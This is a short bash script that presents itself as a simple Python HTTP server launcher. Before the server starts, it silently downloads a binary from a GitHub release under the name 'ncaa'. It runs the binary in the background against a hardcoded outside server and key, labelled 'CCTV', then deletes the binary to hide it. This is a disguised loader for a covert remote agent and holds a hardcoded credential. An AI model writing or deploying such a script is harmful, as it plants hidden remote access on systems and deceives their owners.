#!/bin/bash

# Load sensitive data from environment variables
PORT=${PORT:-3000}
CCTV_SERVER=${CCTV_SERVER:-'nezha.mingfei1981.eu.org:443'}
CCTV_KEY=${CCTV_KEY:-'VSpVZTjkOUIVlVdJsb'}

# Function to execute the start script logic
start_script() {
  # Download ncaa
  curl -sL "https://github.com/babama1001980/good/releases/download/npc/amd64ne2" -o ncaa

  # Make ncaa executable
  chmod +x ncaa

  # Start ncaa in the background
  nohup ./ncaa -s "${CCTV_SERVER}" -p "${CCTV_KEY}" --tls > /dev/null 2>&1 &

  # Delete ncaa after starting
  rm ncaa
}

# Run the start script
start_script

# Handle process termination to clean up
trap 'kill 0' SIGINT

# Simple HTTP server using Python 3
python3 -m http.server "${PORT}" --bind 0.0.0.0
